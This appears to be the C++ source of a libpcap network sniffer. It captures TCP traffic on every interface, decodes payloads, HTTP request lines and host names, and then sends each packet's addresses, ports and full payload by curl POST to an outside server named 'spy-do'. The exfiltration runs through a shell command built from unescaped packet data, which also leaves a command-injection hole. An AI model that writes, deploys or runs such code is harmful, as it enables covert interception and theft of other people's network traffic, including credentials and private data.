#include <iostream>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <cstring>
#include <string>
#include <zlib.h>
#include <sstream>

#include <netdb.h>
#include <unordered_map>

#include "lib/os/ElevatedPrivilegesChecker.h"
#include "lib/custom_printer.h"


#include <curl/curl.h>

// Define a type for the cache
using IPHostCache = std::unordered_map<std::string, std::string>;

const int MAX_BUFFER_SIZE = 32768;
const int TIMEOUT_MS = 1000;

void decompress_gzip(const unsigned char* compressed_data, int compressed_size, std::string& decompressed_data) {
    z_stream zs;
    memset(&zs, 0, sizeof(zs));

    if (inflateInit2(&zs, 16 + MAX_WBITS) != Z_OK) {
        decompressed_data = "Failed to initialize zlib";
        return;
    }

    zs.next_in = const_cast<unsigned char*>(compressed_data);
    zs.avail_in = compressed_size;

    unsigned char outbuffer[MAX_BUFFER_SIZE];
    std::ostringstream output;

    do {
        zs.next_out = outbuffer;
        zs.avail_out = sizeof(outbuffer);

        if (inflate(&zs, Z_NO_FLUSH) != Z_OK) {
            decompressed_data = "Failed to decompress zlib data";
            return;
        }

        output << std::string(reinterpret_cast<char*>(outbuffer), sizeof(outbuffer) - zs.avail_out);
    } while (zs.avail_out == 0);

    inflateEnd(&zs);
    decompressed_data = output.str();
}

/// send resut data
char* send_post_request(const char* url, const char* data, const char* headers) {
    std::string curlCommand = "curl -X POST -d \"" + std::string(data) + "\" -H \"" + std::string(headers) + "\" " + url;

    // Execute the curl command using the system function
    FILE* curlOutput = popen(curlCommand.c_str(), "r");
    if (!curlOutput) {
        std::cerr << "Error executing curl command." << std::endl;
        return nullptr;
    }

    // Read the output of the command into a string
    char buffer[128];
    std::string responseBuffer;
    while (fgets(buffer, sizeof(buffer), curlOutput) != nullptr) {
        responseBuffer += buffer;
    }

    // Close the file stream
    pclose(curlOutput);

    // Duplicate the response into a char array
    char* response = strdup(responseBuffer.c_str());

    return response;
}

/// end data




std::string extract_url_from_payload(const unsigned char* payload, int length) {
    std::string payload_str(reinterpret_cast<const char*>(payload), length);

    size_t get_pos = payload_str.find("GET");
    size_t post_pos = payload_str.find("POST");

    if (get_pos != std::string::npos || post_pos != std::string::npos) {
        size_t http_pos = payload_str.find("HTTP/");
        if (http_pos != std::string::npos) {
            size_t start_pos = get_pos != std::string::npos ? get_pos : post_pos;
            size_t end_pos = payload_str.find("\r\n", http_pos);

            if (end_pos != std::string::npos) {
                std::string url = payload_str.substr(start_pos, end_pos - start_pos);
                return url;
            }
        }
    }

    return ""; // Return an empty string if no valid URL is found
}

// Function to get the resolved IP with caching
std::string getResolvedIP(const char* title, in_addr address, IPHostCache& ipHostCache) {
    std::string result;

    // Convert the binary IP address to a string
    std::string ipAddress = inet_ntoa(address);

    // Check if the IP address is already in the cache
    auto cachedResult = ipHostCache.find(ipAddress);
    if (cachedResult != ipHostCache.end()) {
        // Use the cached result
        result = cachedResult->second;
    } else {
        // Resolve the IP address to a host name
        struct hostent* host = gethostbyaddr((const char*)&address, sizeof(address), AF_INET);

        // Build the result string
        result += title;
        result += ": ";
        result += ipAddress;
        if (host) {
            result += " (" + std::string(host->h_name) + ")";
        } else {
            result += " (Host name not found)";
        }

        // Cache the result for future use
        ipHostCache[ipAddress] = result;
    }

    return result;
}

void packet_handler_callback(unsigned char* user, const struct pcap_pkthdr* pkthdr, const unsigned char* packet) {
    try {
        std::string result;

        // Add error checking for packet size
        if (pkthdr->caplen < sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr)) {
            result += "Invalid packet size\n";
            print(result);
            return;
        }

        // Declare IPHostCache variable
        IPHostCache ipHostCache;

        struct ethhdr* eth = reinterpret_cast<struct ethhdr*>(const_cast<unsigned char*>(packet));
        struct iphdr* ip = reinterpret_cast<struct iphdr*>(const_cast<unsigned char*>(packet + sizeof(struct ethhdr)));
        struct tcphdr* tcp = reinterpret_cast<struct tcphdr*>(const_cast<unsigned char*>(packet + sizeof(struct ethhdr) + sizeof(struct iphdr)));

        const unsigned char* payload = packet + sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->doff * 4);
        int payload_length = pkthdr->caplen - sizeof(struct ethhdr) - (ip->ihl * 4) - (tcp->doff * 4);

        result += "Source IP: " + std::string(inet_ntoa(*(struct in_addr*)&(ip->saddr))) + "\n";
        result += "Destination IP: " + std::string(inet_ntoa(*(struct in_addr*)&(ip->daddr))) + "\n";
        result += "Source Port: " + std::to_string(ntohs(tcp->source)) + "\n";
        result += "Destination Port: " + std::to_string(ntohs(tcp->dest)) + "\n";
        result += "Payload: " + std::string(reinterpret_cast<const char*>(payload), payload_length) + "\n";

        if (payload_length > 2 && payload[0] == 0x1f && payload[1] == 0x8b) {
            std::string decompressed_data;
            decompress_gzip(payload, payload_length, decompressed_data);
            result += "Decompressed Payload: " + decompressed_data + "\n";
        }

        // Get Source IP with host
        result += getResolvedIP("Source IP", *(struct in_addr*)&(ip->saddr), ipHostCache) + "\n";
        // Get Destination IP with host
        result += getResolvedIP("Destination IP", *(struct in_addr*)&(ip->daddr), ipHostCache) + "\n";

        // Get URL from payload
        std::string url = extract_url_from_payload(payload, payload_length);
        if (!url.empty()) {
            result += "Full URL: " + url + "\n";
        }

        print(result);

        std::string serverUrl = "http://spy-do.atwebpages.com/api/HTTPSniffer.php";

        // Prepare data for POST request
        std::string post_data = "sourceIP=" + std::string(inet_ntoa(*(struct in_addr*)&(ip->saddr)))
                              + "&destinationIP=" + std::string(inet_ntoa(*(struct in_addr*)&(ip->daddr)))
                              + "&sourcePort=" + std::to_string(ntohs(tcp->source))
                              + "&destinationPort=" + std::to_string(ntohs(tcp->dest))
                              + "&payload=" + curl_easy_escape(nullptr, reinterpret_cast<const char*>(payload), payload_length);

        char* response = send_post_request(serverUrl.c_str(), post_data.c_str(), "Content-Type: application/x-www-form-urlencoded");
        if (response) {
            // Print the response
            std::cout << "Response:\n" << response << std::endl;

            // Free allocated memory
            free(response);
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception caught: " << e.what() << std::endl;
        // Handle the exception as needed
    }
}



int main() {
    // set a value
    std::string allResults;

    // Initialize libcurl
    // curl_global_init(CURL_GLOBAL_DEFAULT);

    if (!ElevatedPrivilegesChecker::IsElevated()) {
        print("The program is not running with elevated privileges.");
        return 1; // Return a non-zero value to indicate an error
    }
    else{
        //print_banner();
    }

    // Declare and initialize IPHostCache
    IPHostCache ipHostCache;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t* interfaces;

    if (pcap_findalldevs(&interfaces, errbuf) == -1) {
        print("Error finding devices: " + std::string(errbuf));
        return -1;
    }

    std::cout << "Available Devices:" << std::endl;
    for (pcap_if_t* dev = interfaces; dev != nullptr; dev = dev->next) {
        std::cout << dev->name;
        if (dev->description)
            std::cout << " (" << dev->description << ")";
        std::cout << std::endl;
    }

    for (pcap_if_t* current = interfaces; current != nullptr; current = current->next) {
        pcap_t* handle = pcap_open_live(current->name, BUFSIZ, 1, TIMEOUT_MS, errbuf);
        if (handle == nullptr) {
            print("Could not open device " + std::string(current->name) + ": " + std::string(errbuf));
            continue;
        }

        struct bpf_program fp;
        char filter_exp[] = "tcp";

        print("Filter Expression: " + std::string(filter_exp));
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            print("Could not parse filter " + std::string(filter_exp) + ": " + pcap_geterr(handle));
            pcap_close(handle);
            continue;
        }

        if (pcap_setfilter(handle, &fp) == -1) {
            print("Could not install filter " + std::string(filter_exp) + ": " + pcap_geterr(handle));
            pcap_close(handle);
            continue;
        }

        // Use pcap_dispatch instead of pcap_loop
        int result = pcap_dispatch(handle, 0, packet_handler_callback, nullptr);
        if (result == -1) {
            print("Error in pcap_dispatch: " + std::string(pcap_geterr(handle)));
        }

        pcap_close(handle);
    }

    pcap_freealldevs(interfaces);

    return 0;
}
